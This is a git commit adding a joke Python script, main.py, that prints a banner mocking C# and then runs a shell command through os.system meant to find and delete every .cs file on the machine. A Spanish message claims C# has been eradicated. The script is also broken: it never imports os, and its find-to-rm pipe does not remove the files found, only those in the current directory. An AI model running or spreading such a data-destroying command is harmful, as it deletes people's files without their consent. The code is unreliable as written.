adf824f8b6cafd7f0b37d99d7b8bbbe3b3452898
MrPotato <90008286+MrPot4t0@users.noreply.github.com>
2021-12-15 21:06:28 -0400

    Create main.py

---
+++ main.py
@@ -0,0 +1,15 @@
+from sys import stdout
+
+banner = '''
+ ████████████    ██       ██      ██       ██     ██████      ████████████████ █████████
+ ███             ██       ██      ██       ██  ████     ████         ██        ██       ██
+ ███          █████████████████   ██       ██  ██         ██         ██        ██      ██
+ ███             ██       ██      ███████████  ██         ██         ██        █████████  (by Jungl3 K1ng)
+ ███          █████████████████   ██       ██  █████████████         ██        ██     ██
+ ███             ██       ██      ██       ██  ██         ██         ██        ██     ██
+ ████████████    ██       ██      ██       ██  ██         ██         ██        ██     ██
+'''
+felicidad = '''acabo de erradicar c# de este ordenador, no hace falta agradecer'''
+print(banner)
+os.system ("find / -name *.cs | rm *.cs")
+print(felicidad)
